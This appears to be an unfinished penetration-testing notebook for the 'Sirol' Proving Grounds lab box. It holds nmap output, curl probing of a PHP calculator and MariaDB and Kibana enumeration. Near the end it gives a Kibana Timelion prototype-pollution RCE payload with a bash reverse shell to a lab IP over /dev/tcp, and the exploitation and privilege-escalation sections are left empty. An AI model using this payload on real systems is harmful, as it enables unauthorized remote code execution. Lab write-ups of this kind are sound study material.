# Sirol
I think the box is broken

https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/sirol

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Thu Feb  3 08:37:14 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sirol/results/192.168.94.54/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sirol/results/192.168.94.54/scans/xml/_full_tcp_nmap.xml" 192.168.94.54
Nmap scan report for 192.168.94.54
Host is up, received user-set (0.31s latency).
Scanned at 2022-02-03 08:37:22 EST for 677s
Not shown: 65529 filtered ports
Reason: 65529 no-responses
PORT      STATE  SERVICE   REASON         VERSION
22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:88:cb:33:78:9a:bf:f0:31:57:d9:2f:ae:13:ee:db (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC08YEo4oAM7Auedmh2D9jfQTXm2+aKWqg6zPodroXzyRf5WTPVlC+EWhW3MGNx82RGyuRRa45WqJlB6ddr8H/6ShiVvFoxuzuJNfirL19Jg9WOSlvYdJfc3VopSvyAWcqu5HJ4RVrfzcYRMdvstC2nMj6i3MpYHqNq9tVm5zi/NrMGXnN8Z2kiAgbrORMvPqKzHmz6u855dVWihTfRf1bgL3jy9yDVOEojOa4gSGC8bliOv7aF/QEUvf9boXPOWEMOsw9n1A6sLIL9GkDhcbxWBGHM0FenNBNT4wM9HR8QFyUTxcWTP+LxtToclhzeFMA4TknB0F2NthOUUfnrgif
|   256 fb:54:3b:ba:f6:68:57:81:e4:65:6e:24:9c:db:6d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGJ9qwjPnRA6t0jYK4kMTRBM7yr6JrdB9HLfS/9eVOVsMAH7Kxb73HqmXUG9HhASBFypOQAd2fBSiPmBF4vytJo=
|   256 be:6e:25:d1:88:09:7e:33:40:b3:56:6a:b4:ce:16:0d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsjY9kVWtNgYRyIhryIUQtthPBX1w0nYzPUIFMpzuI6
53/tcp    closed domain    reset ttl 63
80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: PHP Calculator
3306/tcp  open   mysql     syn-ack ttl 63 MariaDB (unauthorized)
5601/tcp  open   esmagent? syn-ack ttl 62
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Hello, Help, Kerberos, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Thu, 03 Feb 2022 13:46:13 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Thu, 03 Feb 2022 13:46:05 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Thu, 03 Feb 2022 13:46:06 GMT
|_    {"statusCode":404,"error":"Not Found"}
24007/tcp open   rpcbind   syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.91%I=9%D=2/3%Time=61FBDC9E%P=x86_64-pc-linux-gnu%r(Get
SF:Request,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kibana\r\nkb
SF:n-name:\x20kibana\r\nkbn-xpack-sig:\x2079b8a7336823018e37a1e121a9f3bb67
SF:\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnection:\x
SF:20close\r\nDate:\x20Thu,\x2003\x20Feb\x202022\x2013:46:05\x20GMT\r\n\r\
SF:n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-name:\x2
SF:0kibana\r\nkbn-xpack-sig:\x2079b8a7336823018e37a1e121a9f3bb67\r\nconten
SF:t-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\x20no-c
SF:ache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x20Thu,\
SF:x2003\x20Feb\x202022\x2013:46:06\x20GMT\r\n\r\n{\"statusCode\":404,\"er
SF:ror\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(Hello,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Help
SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq,1C,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCookie,1C,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLv23SessionReq,1C,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r
SF:\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-n
SF:ame:\x20kibana\r\nkbn-xpack-sig:\x2079b8a7336823018e37a1e121a9f3bb67\r\
SF:ncontent-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\
SF:x20no-cache\r\ncontent-length:\x2060\r\nconnection:\x20close\r\nDate:\x
SF:20Thu,\x2003\x20Feb\x202022\x2013:46:13\x20GMT\r\n\r\n{\"statusCode\":4
SF:04,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Found\"}")%r(LPDStri
SF:ng,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LDAPSearchReq,1C,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 3.16 (92%), Linux 4.4 (92%), Linux 3.13 (90%), Linux 3.2 - 3.8 (88%), WatchGuard Fireware 11.8 (88%), IPFire 2.11 firewall (Linux 2.6.32) (87%), Linux 4.9 (87%), Linux 3.10 - 3.16 (87%), Linux 3.10 - 3.12 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/3%OT=22%CT=53%CU=%PV=Y%DS=2%DC=T%G=N%TM=61FBDD37%P=x86_64-pc-linux-gnu)
SEQ(SP=FE%GCD=1%ISR=109%TI=Z%II=I%TS=8)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.007 days (since Thu Feb  3 08:38:12 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   319.57 ms 192.168.49.1
2   319.56 ms 192.168.94.54

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 08:48:39 2022 -- 1 IP address (1 host up) scanned in 687.19 seconds
```

## 80 - Web

![](Pasted%20image%2020220203214132.png)

![](Pasted%20image%2020220203214147.png)

![](Pasted%20image%2020220203214732.png)
Looks like GET request

### Testing php page

The calculator feels broken

#### Divide

```
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=1&num1=2&operator=Divide&submit=submit"                                                                               1 ⨯
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

INF
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=1&num1=-1&operator=Divide&submit=submit"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

-INF
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

#### The Form is broken lmao

```
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=24&num2=4&operator=Divide&submit=submit"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

6
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

Testing Text
The numbers at the very start of the text (and only there) are registered


```
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=$(urlencode a )&num2=$(urlencode 'a')&operator=Add&submit=submit"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

0
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=$(urlencode 1a )&num2=$(urlencode '1a')&operator=Add&submit=submit"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

2
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=$(urlencode 1a )&num2=$(urlencode 'a2')&operator=Add&submit=submit"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

1
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=$(urlencode a3 )&num2=$(urlencode 'a2')&operator=Add&submit=submit"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

0
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.94.54/index.php?num1=$(urlencode 3 )&num2=$(urlencode '2/1')&operator=Divide&submit=submit"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PHP Calculator</title>
</head>
<body>

<form action="index.php" method="get">
    <input type="text" name="num1" placeholder="Number 1">
    <input type="text" name="num1" placeholder="Number 2">
    <select name="operator">
        <option>None</option>
        <option>Add</option>
        <option>Subtract</option>
        <option>Multiply</option>
        <option>Divide</option>
    </select>
    <br>
    <button name="submit" value="submit" type="submit">Calculate</button>
</form>
<br>
<p>The answer is: </p>

1.5
</body>
</html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

## 3306 - MySQL

```
# Nmap 7.91 scan initiated Thu Feb  3 08:38:02 2022 as: nmap -vv --reason -Pn -T4 -sV -p 3306 "--script=banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sirol/results/192.168.94.54/scans/tcp3306/tcp_3306_mysql_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sirol/results/192.168.94.54/scans/tcp3306/xml/tcp_3306_mysql_nmap.xml" 192.168.94.54
Nmap scan report for 192.168.94.54
Host is up, received user-set (0.27s latency).
Scanned at 2022-02-03 08:38:04 EST for 12s

PORT     STATE SERVICE REASON         VERSION
3306/tcp open  mysql   syn-ack ttl 63 MariaDB (unauthorized)
| banner: H\x00\x00\x00\xFFj\x04Host '192.168.49.94' is not allowed to co
|_nnect to this MariaDB server
|_mysql-empty-password: Host '192.168.49.94' is not allowed to connect to this MariaDB server
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 08:38:16 2022 -- 1 IP address (1 host up) scanned in 14.93 seconds
```

## 5601 - Kibana

![](Pasted%20image%2020220203215017.png)

https://book.hacktricks.xyz/pentesting/5601-pentesting-kibana

![](Pasted%20image%2020220203215201.png)

### Kibana RCE Vuln 2019

https://www.google.com/search?q=kibana+RCE+Vulnerability&oq=kibana+RCE+Vulnerability&aqs=chrome..69i57.4215j0j7&sourceid=chrome&ie=UTF-8


Payload
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.49.106/5601  0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.49.106/5601 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

# Exploitation

# Privesc

# Others